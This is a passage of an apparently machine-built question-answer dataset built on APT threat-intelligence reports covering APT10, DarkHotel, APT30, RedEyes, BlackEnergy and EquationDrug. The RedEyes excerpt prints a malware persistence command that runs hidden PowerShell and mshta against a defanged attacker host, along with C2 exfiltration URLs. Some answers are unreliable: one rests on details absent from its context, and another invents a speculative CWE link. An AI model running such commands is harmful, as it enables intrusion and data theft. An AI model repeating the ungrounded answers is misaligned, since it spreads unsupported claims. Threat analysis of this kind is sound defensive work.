throughout 2016 and 2017, we similarly assess it currently comprises multiple teams, each responsible for a different section of the day-to-day operations, namely domain registration, infrastructure management, malware development, target operations, and analysis.\nAPT10 withdrew from direct targeting using Poison Ivy in 2013 and conducted its first known retooling operation, upgrading its capabilities and replatforming to use PlugX. It is highly likely that this is due to the release of the 2013 FireEye report.\nOur report will detail the most recent campaigns conducted by APT10, including the sustained targeting of MSPs, which we have named Operation Cloud Hopper, and the targeting of a number of Japanese institutions.\n1 The defence industrial base comprises the US Department of Defense and a plethora of companies that support the design, development and maintenance of defence assets and enable US military requirements to be met. https://www.dhs.gov/defense-industrial-base-sector\n2 https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-poison-ivy.pdf\n3 http://blog.trendmicro.com/trendlabs-security-intelligence/evilgrab-malware-family-used-in-targeted-attacks-in-asia/\nMedium Headline: Time-based analysis of APT10's operations\nAs part of our analysis, we have made a number of observations about APT10 and its profile, which supports our assessment that APT10 is a China-based threat actor. For example, we have identified patterns within the domain registrations and file compilation times associated with APT10 activity. This is almost certainly indicative of a threat actor based in the UTC+8 time zone, which aligns to Chinese Standard Time (CST).\nShown in Figure 1 are registration times4, represented in UTC, for known APT10 top level domains since mid-2016, which mark a major uptick in APT10 activity.\nMapping this to UTC+8, as in Figure 2, shows a standard set of Chinese business hours, including a two-hour midday break.\nFigure 1: APT10 domain registration times in UTC\nFurther analysis of the compile times of PlugX, RedLeaves and Quasar malware samples used by APT10 reveals a similar pattern in working hours, as shown in Figure 3.\nShifting this to UTC+8 shows a similar timeframe of operation to the domain registrations. There are some outliers, which are likely attributable to the operational nature of this threat actor, such as requirements to work outside normal business hours.\nFigure 3: Compile times of PlugX, RedLeaves and Quasar in UTC\n4 The bubbles shown on Figures 1 through 6 are representative of the number of events observed at that time and date.\nWhen applying the time shift to the ChChes malware (newly used by APT10) compilation timestamps, we see a different pattern as shown in Figure 5. While this does not align with Chinese business hours, it is likely to be either a result of the threat actor changing its risk profile by attempting to obscure\nor confuse attribution or a developer's side project that has ended up being used on targeted operations. Based on other technical overlaps, ChChes is highly likely to be exclusively used by APT10.\nFigure 5: Compile time of ChChes in UTC\nTo further this analysis, we have observed the threat actor conducting interactive activities primarily between the hours of midnight and 10:00 UTC, as shown in Figure 7. When converting this to UTC+8 we again see a shift to Chinese business hours, with operations occurring between 08:00 and 19:00. It is a realistic probability that the weekend work observed in Figure 7 may be necessary as part of operational requirements.\nThe sum of this analysis aligns with the evidence provided by the United States Department of Justice indictment against several individuals associated with APT1,5 another China-based threat actor, showing a working day starting at 08:00 UTC+8 and finishing at 18:00 UTC+8 with a two hour lunch break from 12:00 UTC+8 until 14:00 UTC+8.\nFigure 7: Operational times of APT10 in UTC+8\n5 https://www.justice.gov/iso/opa/resources/5122014519132358461949.pdf\n\nBased on the above text, answer a question. What characteristics of APT10's command and control infrastructure suggest an increase in operational tempo, and how does this relate to previous activities?",
    "output": "The command and control infrastructure used for Operation Cloud Hopper is predominantly dynamic-DNS domains, which are highly interconnected and link to the threat actor's previous operations. The significant increase in the number of dynamic-DNS domains in use by APT10 since 2016 indicates an increase in operational tempo. Additionally, some top-level domains used in the direct targeting of Japanese entities share common IP address space with the network of dynamic-DNS domains associated with Operation Cloud Hopper.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Defense official discloses cyberattack\nNow it is official: The most significant breach of U.S. military computers was caused by a flash drive inserted into a U.S. military laptop on a post in the Middle East in 2008.\nIn an article to be published Wednesday discussing the Pentagon's cyberstrategy, Deputy Defense Secretary William J. Lynn III says malicious code placed on the drive by a foreign intelligence agency uploaded itself onto a network run by the U.S. military's Central Command.\n\"That code spread undetected on both classified and unclassified systems, establishing what amounted to a digital beachhead, from which data could be transferred to servers under foreign control,\" he says in the Foreign Affairs article.\n\"It was a network administrator's worst fear: a rogue program operating silently, poised to deliver operational plans into the hands of an unknown adversary.\"\nLynn's decision to declassify an incident that Defense officials had kept secret reflects the Pentagon's desire to raise congressional and public concern over the threats facing U.S. computer systems, experts said.\nMuch of what Lynn writes in Foreign Affairs has been said before: that the Pentagon's 15,000 networks and 7 million computing devices are being probed thousands of times daily; that cyberwar is asymmetric; and that traditional Cold War deterrence models of assured retaliation do not apply to cyberspace, where it is difficult to identify the instigator of an attack.\nBut he also presents new details about the Defense Department's cyberstrategy, including the development of ways to find intruders inside the network. That is part of what is called \"active defense.\"\nHe puts the Homeland Security Department on notice that although it has the \"lead\" in protecting the dot.gov and dot.com domains, the Pentagon - which includes the ultra-secret National Security Agency - should support efforts to protect critical industry networks.\nLynn's declassification of the 2008 incident has prompted concern among cyberexperts that he gave adversaries useful information. The Foreign Affairs article, Pentagon officials said, is the first on-the-record disclosure that a foreign intelligence agency had penetrated the U.S. military's classified systems. In 2008, the Los Angeles Times reported, citing anonymous Defense officials, that the incursion might have originated in (<http://www.washingtonpost.com/wp-srv/world/countries/russia.html?nav=el>)Russia.\nThe Pentagon operation to counter the attack, known as Operation Buckshot Yankee, marked a turning point in U.S. cyberdefense strategy, Lynn said. In November 2008, the Defense Department banned the use of flash drives, a ban it has since modified.\nInfiltrating the military's command and control system is significant, said one former intelligence official who spoke on the condition of anonymity because of the sensitivity of the matter. \"This is how we order people to go to war. If you're on the inside, you can change orders. You can say, 'turn left' instead of 'turn right.' You can say 'go up' instead of 'go down.' \"\nIn a nutshell, he said, the \"Pentagon has begun to recognize its vulnerability and is making a case for how you've got to deal with it.\"\n1/1\n\nAnswer this question based on the above context: How did the 2008 cyberattack on U.S. military computers occur, and what were the immediate consequences of this breach?",
    "output": "The 2008 cyberattack on U.S. military computers occurred when a flash drive containing malicious code was inserted into a U.S. military laptop on a post in the Middle East. This malicious code was placed on the drive by a foreign intelligence agency and subsequently uploaded itself onto a network run by the U.S. military's Central Command. The code spread undetected on both classified and unclassified systems, establishing a digital beachhead from which data could be transferred to servers under foreign control. This incident represented a network administrator's worst fear, as it allowed an unknown adversary to potentially access sensitive operational plans.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nThe DarkHotel threat actors have been known to operate for a decade now, targeting thousands of businesses across the world via Wi\u00adFi infrastructure in hotels. Blending whaling (high-level spear phishing) techniques with advanced malware and other complex attack avenues (such as digital certificate factoring), the threat actors have been able to run their business undisturbed for years, except for the few times when samples of DarkHotel malware is documented in blog posts by threat researchers.\nThis whitepaper covers such a sample of a particular DarkHotel attack, known as lnexsmar. The sample dates back to September 2016, but our malware zoo reveals that samples with a high degree of similitude have been around since 2011.\nUnlike any other known DarkHotel campaigns, the isolated sample uses a new payload delivery mechanism rather than the consacrated zero-day exploitation techniques. Instead, the new campaign blends social engineering with a relatively complex Trojan to infect its selected pool of victims.\nMoreover, while most known DarkHotel campaigns target corporate research and development personnel, CEOs and other senior corporate officials, this attack seems focused on politics rather than financial gains.\n\nWhy did the DarkHotel threat actors shift their focus from targeting corporate personnel to political targets in the Inexsmar attack? Additionally, how does this change in targeting reflect on their overall strategy and capabilities?",
    "output": "The DarkHotel threat actors shifted their focus from targeting corporate research and development personnel, CEOs, and other senior corporate officials to political targets in the Inexsmar attack. This change in targeting suggests a strategic pivot towards influencing geopolitical outcomes rather than pursuing financial gains. This shift reflects the group's versatility and adaptability, indicating that they possess the capability to tailor their operations to different objectives. By targeting political entities, DarkHotel demonstrates an advanced level of sophistication and a deep understanding of the potential impact of their actions on global affairs.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nSmall Headline: BACKDOORS\nDespite their long history of operations, APT30 has primarily relied on a two backdoors to support their activity: BACKSPACE29 and NETEAGLE. Both backdoors have evolved into a number of variants. BACKSPACE has diverged into two main branches (\"ZJ\" and \"ZR\") with numerous variations throughout each branch. Similarly, NETEAGLE has two main versions, \"Scout\" and \"Norton\", with Norton being the later (more recent) version. The two backdoors differ widely in their development features, including differing programming languages and different sets of commands supported by each. Despite this, the two also share some high-level design similarities, including update features and the use of two-stage command and control infrastructures. The following table highlights some of the similarities and differences between the two families.30\nTable 6:  Comparison of BACKSPACE and NETEAGLE backdoors\nVery Small Headline: BACKSPACE BACKDOOR \u2013 \"ZJ\" VARIANT\nThe \"ZJ\" branch of the BACKSPACE backdoor appears to be the oldest or \"original\" branch, with versions dating back to 2005. Variants of this branch are still being developed and compiled, adding a broad range of supported commands while still retaining the core functionality of the original versions.\nThe BACKSPACE variant 8c713117af4ca6bbd69292a78069e75b was compiled on August 26, 2014. It represents one member of the \"ZJ\" branch of the BACKSPACE malware family.\nMedium Headline: Initial Execution\nThe mutex MicrosoftZjSYNoReg is used to guarantee that only one instance of the malware is running at any time. BACKSPACE also creates two events (MicrosoftSYNoRegExit, MicrosoftSYNoRegHaveExit) that, when signaled, trigger all the threads and the malware itself to exit. A third event, MicrosoftSYNoRegHaveAck, is created to be used by the malware to synchronize the processing of a task with an acknowledgement received from the C2 server.\nThe malware extracts system information (OS version, build number, platform, service pack, default language id) and proxy information (from the ProxyEnable and ProxyServer values under HKEY_CURRENT_ USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\) from the victim host.\nBACKSPACE then creates the registry values lnk (type REG_SZ) and hostid (type REG_DWORD) under the HKEY_CURRENT_USER\\Software\\Microsoft\\CurrentHalInf registry key:\n\u2022 lnk is set NTO/mol which is the encoded31 text MSN.lnk.\n\u2022 hostid is set to a random value that is used to uniquely identify the victim computer.\nThe malware creates a copy of itself in the folder <CSIDL_PROGRAMS>\\Messenger\\BIN as msmsgs.exe, creating the folder if necessary. For persistence, BACKSPACE creates the Windows shortcut file MSN.lnk in <CSIDL_STARTUP> pointing to <CSIDL_PROGRAMS>\\Messenger\\BIN\\msmsgs.exe with the description \"Windows Messenger\".\nMedium Headline: C2 Domains\nLike many BACKSPACE variants, this sample is configured with four different C2 domains. The C2 domains are used in HTTP requests for various files; each file requested via the URI provides additional instructions or data to the malware. BACKSPACE C2 domains are typically used for different purposes \u2013 that is, each domain is associated with different URIs whose associated files support different functions.\nFor this sample, the four C2 domains have the following roles:\nTable 7: BACKSPACE C2 domains and registration dates\n\nWhat system and proxy information does the BACKSPACE backdoor extract from the victim host during its initial execution? How does it establish persistence on the infected system?",
    "output": "During its initial execution, the BACKSPACE backdoor extracts system information such as OS version, build number, platform, service pack, and default language ID, as well as proxy information from the 'ProxyEnable' and 'ProxyServer' values under the registry key 'HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings'. To establish persistence, BACKSPACE creates a copy of itself in the folder '<CSIDL_PROGRAMS>\\\\Messenger\\\\BIN' as 'msmsgs.exe', and creates a Windows shortcut file 'MSN.lnk' in '<CSIDL_STARTUP>' pointing to this executable with the description 'Windows Messenger'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 2.1. Initial Access\nOn January 13, an HWP EPS vulnerability (CVE-2017-8291) attack involving the usage of the filename \"Form.hwp\" was discovered by AhnLab's ASD (AhnLab Smart Defense). The HWP document was not collected at the time of the analysis, but we were able to procure the EPS file that triggered the aforementioned vulnerability.\nEPS is a type of graphic format that uses the PostScript programming language by Adobe to show graphics. High-resolution vector images can be shown through EPS and the Hangul Word Processor supported a third-party module (ghostscript) to process EPS files. However, due to an increase in malicious EPS vulnerability exploitations, such as APT attacks, (<https://www.hancom.com/board/noticeView.do?artcl_seq=6606>)Hancom has removed the third-party EPS processing module.\nAdditionally, the ASEC analysis team posted (<https://asec.ahnlab.com/wp-content/uploads/tistory/1239_AhnLab_ASEC_%ED%95%9C%EA%B8%80%ED%8C%8C%EC%9D%BC%EC%97%90%EC%88%A8%EC%96%B4%EB%93%A0%EA%B3%A0%EC%8A%A4%ED%8A%B8.pdf>)a detailed analysis report on the CVE-2017-8291 vulnerability back in 2019.\nThe \"Form.hwp\" file includes a vulnerable EPS file (CVE-2017-8291) which is shown in Figure 4. When the user opens the file (\"Form.hwp\"), the vulnerability allows the threat actor's shellcode to run through the third-party module.\nThe shellcode downloads an image file (JPEG) from the threat actor's server (C&C) and decrypts the encoded PE file contained within the image file. Afterward, it creates the PE file in the %temp% path before executing it.\nMedium Headline: 2.2. Defense Evasion\nThe shellcode downloaded an image file from the threat actor's server and executed an additional piece of malware. In other words, the threat actor used the steganography technique to embed a malware strain within an image. We assume that this was done to evade network detection. It appears that the steganography image file used by the threat actor was obtained from a wallpaper-sharing website called \"wallup.net\".\nThe image file consists of a normal JPEG header, the meta data required for decoding the PE file (XOR key and file size), and the encoded PE file.\nA 16-byte XOR key is used for PE decoding to XOR 1 byte at a time.\nThe ultimately decoded PE file is created and executed under the name lskdjfel.exe in the %temp% path. The executed PE file is responsible for downloading an additional backdoor malware (M2RAT), injecting it into explorer.exe, and adding both Powershell and mshta commands to the autorun registry Run key to establish a persistent connection with the threat actor's server.\nSmall Headline: [RedEyes (ScarCruft) registry Run key command in 2023]\nc:\\windows\\system32\\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 340328 2.2.2.2 || mshta hxxps://www.*******elearning.or[.]kr/popup/handle/1.html\nWhenever the affected host PC is booted up, the registry key causes Powershell and the normal Windows utility, mshta, to also be executed. At the time of analysis, an HTA (HTML Application) file containing a JS (JavaScript) code was collected from the \"1.html\" file that mshta had downloaded from the threat actor's server.\nThe JS code is responsible for executing the Powershell command, which receives and executes commands from the threat actor's server, and returns the results.\nWhen the Powershell adds a \"U\" parameter to the threat actor's server address when transmitting the computer name and username, the threat actor's server encodes the CMD command that is going to be executed in BASE64 before sending it to the affected host. The encoded BASE64 command is then decoded by Powershell and executed. The result of the command is saved as a file in the %temp%\\vnGhazwFiPgQ path. Afterward, an \"R\" parameter is added to the threat actor's server which then encodes the command execution result in BASE64 before sending it.\nhxxps://www.*******elearning.or[.]kr/popup/handle/log.php? U=[Computer Name]+[Username] // Receive the threat actor's command\nhxxps://www.*******elearning.or[.]kr/popup/handle/log.php? R=[BASE64-encoded] // Send command execution result\nMedium Headline: 2.4. M2RAT (Map2RAT)\nThe ultimately executed backdoor operates after being injected into explorer.exe. The main features of this backdoor are similar to those of basic remote control malware, which include keylogging, data leakage (files and recordings), running or terminating processes, and capturing screenshots.\nHowever, the recently discovered backdoor has a different command system compared to the previously identified Chinotto malware. It does not save the keylogging data or screenshot logs in the affected system but instead sends them to the threat actor's server, leaving no traces of the stolen data in the affected system.\nThe ASEC analysis team named this newly identified malware M2RAT ( Map2 RAT) after the common name within the shared memory section used during C&C communication.\nFileInput Map2\nProcessInput Map2\nCaptureInput Map2\nRawInput Map2\nRegistryModuleInput Map2\nTypingRecordInput Map2\nUsbCheckingInput Map2\nVery Small Headline: C&C Command Description\nM2RAT's threat actor server manages hosts with MAC addresses in order to distinguish affected hosts. When infected with M2RAT, the MAC address is encoded (XOR) with 0x5c and saved in the \"HKCU\\Software\\OneDriver\" path's \"Version\" value. The encoded MAC address value is used to distinguish affected hosts in the threat actor's server.\nRegistry key path: HKCU\\Software\\OneDriver\nValue name: Version\nValue: Value that XOR-encoded (0x5c) MAC address of the affected host\nThe result value of the command sent by the threat actor to the affected host is saved in the \"_Encoded MAC Address Value_2\" folder of the threat actor's server. The screenshots taken by M2RAT from the affected host are saved in the \"_Encoded MAC Address Value_cap\" folder. (Refer to Figure 12)\nAdditionally, M2RAT XOR encodes with 0x5c and saves the threat actor's server address info in the \"Property\" value of the same registry key path as the MAC address.\nRegistry key path: HKCU\\Software\\OneDriver\nValue name: Property\nValue: Value that XOR-encoded (0x5c) threat actor's server address\nIn the future, the threat actor can transmit the \"URL\" and \"UPD\" commands to M2RAT to update their server address (Refer to Table 1). The \"URL\" command is used to update the registry key with a new address and the \"UPD\" command is used to change the threat actor's address defined in the currently running instance of M2RAT.\nThe remote control command of M2RAT is established by transmitting CMD commands from the threat actor's server. The Chinotto malware, which was confirmed to have been used by the RedEyes group in the past, executed remote control commands through the Query String method, but M2RAT creates a shared memory section to execute the commands from the threat actor's server. Like the threat actor's use of the steganography technique in the initial breach stage, this appears to also be for the purpose of evading network detection by hiding the command info in the Body of the POST.\n(* Query String: A string that starts with a question mark at the end of a URL)\nThe CMD command is transmitted through the shared memory. The memory section name info is shown below in Table 2.\nSmall Headline: 2.4.2. Exfiltration\nM2RAT's exfiltration features include screenshots of the affected host's screen, process information, keylogging information, and data (documents and voice files) leaks. In the case of screenshots, they are taken regularly even if a command is not given by the threat actor. They are then sent to the threat actor's server where they are saved as \"result_[number]\" in the \"_Encoded MAC Address Value_cap\" folder.\nThe remaining data leaks are saved in the \"_Encoded MAC Address Value_2\" folder.\nIf there are documents or voice recordings with sensitive data in removable storage devices or shared folders, then these are copied into the %TEMP% path, compressed into a password-protected file with Winrar (RAR.exe), and the results are then transmitted to the threat actor's server.\nFolder path where data is copied to: %Temp%\\Y_%m_%d_%H_%M_%S // (e.g. %TEMP%\\Year_Month_Date _Hour_Minute_Second)\nFile extensions: hwp, doc, docx, xls, xlsx, ppt, pptx, cell, csv, show, hsdt, mp3, amr, 3gp, m4a, txt, png, jpg, jpeg, gif, pdf, eml\nThe RAR.exe options that are used are as follows. The path the compressed file is created into is the same as the %TEMP% folder path.\na -df -r -hp dgefiue389d@39r#1Ud -m1 \"Compressed file creation path\" \"Compression target path\"\nThe ASEC analysis team was also able to uncover through the ASD (AhnLab Smart Defense) infrastructure an Infostealer communicating with M2RAT. This malware was identified as a .NET file that steals files saved on mobile phones and sends them to the RegistryModuleResultMap2 shared memory section of M2RAT.\nThe .NET file's PDB info is as follows.\nBig Headline: 3. Conclusion\nThe RedEyes group is an APT hacking organization that is supported on a national level. They are known to attack individual targets such as human rights activists, reporters, and North Korean defects. Their aim appears to be exfilitration. Defending against such APT attacks is an extremely complicated process. Especially since the RedEyes group is known to target individuals instead of corporations. It is difficult for individuals to even realize they have been affected. The ASEC analysis team is closely tracking this group. Should a new TTPs be found from this threat actor, we will quickly share the details as we did in this blog post to contribute towards minimizing damage.\nQ: What techniques does the RedEyes group use to evade network detection during the initial stages of their attack, and how do they achieve persistence on the compromised system?",
    "output": "The RedEyes group uses steganography to embed a malware strain within an image file to evade network detection. The image file, obtained from a wallpaper-sharing website, contains a normal JPEG header, metadata for decoding the PE file (XOR key and file size), and the encoded PE file. Once decoded and executed, the PE file downloads additional backdoor malware (M2RAT), injects it into explorer.exe, and adds both Powershell and mshta commands to the autorun registry Run key to establish a persistent connection with the threat actor's server.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: BlackEnergy by the SSHBearDoor: attacks against Ukrainian news media and electric industry\nby Anton Cherepanov \u2022 Jan. 3, 2016 \u2022 4 min read \u2022 (<http://www.welivesecurity.com/2016/01/03/blackenergy-sshbeardoor-details-2015-attacks-ukrainian-news-media-electric-industry/>)original\nUpdate: In case you want to have a more simplified (<http://www.welivesecurity.com/2016/01/04/blackenergy-trojan-strikes-again-attacks-ukrainian-electric-power-industry/>)version of this article, please check out BlackEnergy trojan strikes again: Attacks Ukrainian electric power industry.\nThe cybercriminal group behind BlackEnergy, the malware family that has been around since 2007 and has made a comeback in 2014 (see our previous blog (<http://www.welivesecurity.com/2014/09/22/back-in-blackenergy-2014/>)posts on Back in BlackEnergy *: 2014 Targeted Attacks\nESET has recently discovered that the BlackEnergy trojan was recently used as a backdoor to deliver a destructive KillDisk component in attacks against Ukrainian news media companies and against the electrical power industry. In this blog, we provide details on the BlackEnergy samples ESET has detected in 2015, as well as the KillDisk components used in the attacks. Furthermore, we examine a previously unknown SSH backdoor that was also used as another channel of accessing the infected systems, in addition to BlackEnergy.\nWe continue to monitor the BlackEnergy malware operations for future developments. For any inquiries or to make sample submissions related to the subject, contact us at: (<mailto:threatintel@eset.com>)threatintel@eset.com\nAnswer this question: How did the BlackEnergy trojan facilitate the delivery of the destructive KillDisk component in the attacks against Ukrainian news media companies and the electrical power industry?",
    "output": "The BlackEnergy trojan acted as a backdoor, allowing attackers to gain unauthorized access to the targeted systems. This access was then leveraged to deliver the KillDisk component, which is designed to cause destruction within the compromised systems. Additionally, an unknown SSH backdoor was used as another channel for accessing the infected systems, providing multiple entry points for the attackers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: C0901C04EC2C17B: 1 year(s) 8 month(s) 2 day(s) 6 hour(s) 29 min(s) 39 sec(s)\n66701C04EC2C17B: 1 year(s) 6 month(s) 9 day(s) 2 hour(s) 10 min(s) 23 sec(s)\nF6501C04EC2C17B: 1 year(s) 6 month(s) 6 day(s) 19 hour(s) 53 min(s) 22 sec(s)\n01401C04EC2C17B: 1 year(s) 6 month(s) 25 day(s) 23 hour(s) 34 min(s) 13 sec(s)\nAfter that, the module stores current time values in encrypted form in the registry value:\n[HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys] {08DAB849-0E1EA1F0-DCF1-457081E091DB-117DB663} (encoded SHA1 of \"StartTime\")\nThe module contains an additional compressed Windows DLL \u0141le in the resource section, which is extracted as \"unilay.dll\" (see below). This DLL exports a number of functions that are just wrappers of the system API used to work with \u0141les and the registry, and also start processes and load additional DLL \u0141les.\nThe orchestrator contains several built-in plugins that form the core of the platform. These are initialized in the \u0141rst place, and then additional plugins are loaded. All the plugins are indexed in a single encrypted registry value:\n[HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys] 1\nThis value has information about all the components of the current kit. It may include Unicode strings with paths to extra DLLs which serve as plugins. Each DLL exports at least four functions which are imported by ordinal numbers from 1 to 4.\nThe structure of the registry value \"1\":\n[Count:DWORD]{ [Plugin Id:WORD][Plugin Path Length:DWORD][Plugin Path String:VARIABLE] }\nPlugins interact with each other and with the orchestrator by exchanging messages of pre-de\u0141ned format. The message transport is implemented as a global object that contains four communication streams. Every stream contains a pair of kernel synchronization object handles (a semaphore with \u0141xed maximum value defaulted to 1000 and a mutex) and a message queue as an array. A dedicated thread processes messages that appear in the message queues.\nA message arrives in a parcel, represented as two DWORD values that contain the size of the message and a pointer to the message data. The message data starts with a DWORD identifying a class of message (a\nrequest, reply, etc).\nThe orchestrator contains the following built-in plugins (listed by internal ID): 8000, 8022, 8024, 803C, 8046, 800A, 8042, 8002, 8004, 8006, 8008, 8070, 808E. Several additional built-in modules have been discovered in newer versions of the orchestrator that was shipped with the GrayFish platform.\n\nQuestion: What is the role of the 'unilay.dll' file in the EquationDrug platform, and how does it facilitate the platform's operations?\n\nAnswer:",
    "output": "The 'unilay.dll' file is a compressed Windows DLL file contained within the resource section of the EquationDrug module. This DLL exports a number of functions that act as wrappers for system APIs, enabling the platform to work with files and the registry, start processes, and load additional DLL files. By using these wrapper functions, the platform can perform various tasks necessary for cyberespionage activities, such as file manipulation and process execution, while maintaining a level of abstraction that makes it easier to update or modify functionality without changing the core code.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does APT34 utilize scheduled tasks to maintain persistence and execute malicious code in their phishing campaign?",
    "output": "Scheduled tasks are a common mechanism used by adversaries to execute malicious code at system startup or on a scheduled basis for persistence. In the case of APT34, they utilized a scheduled task named 'windows update check' to run the file C:\\Users\\<user_name>\\.templates\\System Manager.exe every minute. This scheduled task was created by a malicious spreadsheet, ERFT-Details.xls, which was delivered to the victim via a LinkedIn message. The spreadsheet contained VBA code that created the scheduled task, which was designed to appear as a legitimate Windows update check. However, the task actually executed the System Manager.exe file, which was a variant of the TONEDEAF malware. By utilizing a scheduled task, APT34 was able to maintain persistence on the victim's system and execute malicious code without arousing suspicion.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the Darkhotel APT exploit CVE-2014-0497 to target specific systems connected to the Internet through Chinese ISPs?",
    "output": "CVE-2014-0497 is an integer underflow vulnerability in Adobe Flash Player that allows remote attackers to execute arbitrary code via unspecified vectors. The Darkhotel APT exploited this vulnerability by embedding Flash objects in Korean documents, which were then sent to target systems connected to the Internet through Chinese ISPs. The Flash objects were designed to handle hardened Windows 8.1 systems, and once executed, they delivered malcode similar to the 'Information Stealer' component functionality. This exploit was part of the Darkhotel APT's spear-phishing campaign, which targeted defense industrial base (DIB), government, and NGO organizations. The use of CVE-2014-0497 demonstrates the Darkhotel APT's ability to deploy 0-day exploits to achieve their goals.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Duqu 2.0 APT's use of temporary files, such as those with the '.fg4' extension, potentially relate to the CWE-377: Insecure Temporary File vulnerability?",
    "output": "CWE-377: Insecure Temporary File is a vulnerability that occurs when an application creates and uses temporary files in an insecure manner, leaving application and system data vulnerable to attack. In the case of the Duqu 2.0 APT, the use of temporary files with the '.fg4' extension, as mentioned in the context of module 7C23, raises concerns about the security of these files. Although the context does not explicitly state that these temporary files are insecure, the fact that they are created and used by the APT suggests that they may be vulnerable to exploitation. An attacker could potentially access or manipulate these temporary files, leading to unauthorized access to sensitive information or disruption of system operations. Furthermore, the Duqu 2.0 APT's use of temporary files may indicate a larger pattern of insecure file handling, which could be leveraged by attackers to compromise the system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: MITIGATIONS\nNorth Korean state-sponsored cyber actors use a full array of tactics and techniques to exploit computer networks of interest, acquire sensitive cryptocurrency-intellectual property, and gain financial assets. The U.S. government recommends implementing mitigations to protect critical infrastructure organizations as well as financial sector organizations in the blockchain technology and cryptocurrency industry.\n\u25cf Apply defense-in-depth security strategy. Apply security principles\u2014such as least access models and defense-in-depth\u2014to user and application privileges to help prevent exploitation attempts from being successful. Use network segmentation to separate networks into zones based on roles and requirements. Separate network zones can help prevent lateral movement throughout the organization and limit the attack surface. See NSA's Top Ten Cybersecurity Mitigation Strategies for strategies enterprise organizations should use to build a defense-in-depth security posture.\n\u25cf Implement patch management. Initial and follow-on exploitation involves leveraging common vulnerabilities and exposures (CVEs) to gain access to a networked environment. Organizations should have a timely vulnerability and patch management program in place to mitigate exposure to critical CVEs. Prioritize patching of internet-facing devices and monitored accordingly for any malicious logic attacks.\n\u25cf Enforce credential requirements and multifactor authentication. North Korean malicious cyber actors continuously target user credentials, email, social media, and private business accounts. Organizations should ensure users change passwords regularly to reduce the impact of password spraying and other brute force techniques. The U.S. government recommends organizations implement and enforce multifactor authentication (MFA) to reduce the risk of credential theft. Be aware of MFA interception techniques for some MFA implementations and monitor for anomalous logins.\n\u25cf Educate users on social engineering on social media and spearphishing. North Korean actors rely heavily on social engineering, leveraging email and social media platforms to build trust and send malicious documents to unsuspecting users. A cybersecurity aware workforce is one of the best defenses against social engineering techniques like phishing. User training should include how to identify social engineering techniques and awareness to only open links and attachments from trusted senders.\n\u25cf Implement email and domain mitigations. Maintain awareness of themed emails surrounding current events. Malicious cyber actors use current events as lure for potential victims as observed during the COVID-19 pandemic. Organizations should have a robust domain security solution that includes leveraging reputation checks and closely monitoring or blocking newly registered domains (NRDs) in enterprise traffic. NRDs are commonly established by threat actors prior to malicious engagement.\no HTML and email scanning. Organizations should disable HTML from being used in emails and scan email attachments. Embedded scripts may be hard for an antivirus product to detect if they are fragmented. An additional malware scanning interface product can be integrated to combine potentially malicious payloads and send the payload to the primary antivirus product. Hyperlinks in emails should also be scanned\nand opened with precautionary measures to reduce the likelihood of a user clicking on a malicious link.\n\u25cf Endpoint protection. Although network security is critical, devices mobility often means traveling and connecting to multiple different networks that offer varying levels of security. To reduce the risk of introducing exposed hosts to critical networks, organizations should ensure mobile devices have installed security suites to detect and mitigate malware.\n\u25cf Enforce application security. Application allowlisting enables the organization to monitor programs and only allow those on the approved allowlist to execute. Allowlisting helps to stop the initial attack, even if the user clicks a malicious link or opens a malicious attachment. Implement baseline rule sets, such as NSA's Limiting Location Data Exposure guidance, to block execution of unauthorized or malicious programs.\no Disable macros in office products. Macros are a common method for executing code through an attached office document. Some office products allow for the disabling of macros that originate from outside of the organization, providing a hybrid approach when the organization depends on the legitimate use of macros.\n\u25aa Windows specific settings can be configured to block internet-originated macros from running. This can be done in the Group Policy Administrative Templates for each of the associated Office products (specifically Word, Excel and PowerPoint). Other productivity software, such as LibreOffice and OpenOffice, can be configured to set the Macro Security Level.\n\u25cf Be aware of third-party downloads\u2014especially cryptocurrency applications. North Korean actors have been increasingly active with currency generation operations. Users should always verify file downloads and ensure the source is from a reputable or primary (preferred) source and not from a third-party vendor. Malicious cyber actors have continuously demonstrated the ability to trojanize applications and gain a foothold on host devices.\n\u25cf Create an incident response plan to respond to possible cyber intrusions. The plan should include reporting incidents to both the FBI and CISA\u2014quick reporting can reduce the severity of incidents and provide valuable information to investigators. Contact information can be found below.\n\nQ: How does the defense-in-depth security strategy help in protecting organizations from North Korean state-sponsored cyber actors, and what specific measures can be implemented to achieve this?",
    "output": "A: The defense-in-depth security strategy helps protect organizations by applying multiple layers of security controls to prevent exploitation attempts from being successful. Specific measures include applying least access models and defense-in-depth principles to user and application privileges, and using network segmentation to separate networks into zones based on roles and requirements. This separation helps prevent lateral movement throughout the organization and limits the attack surface. Additionally, organizations can refer to NSA's Top Ten Cybersecurity Mitigation Strategies to build a robust defense-in-depth security posture.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
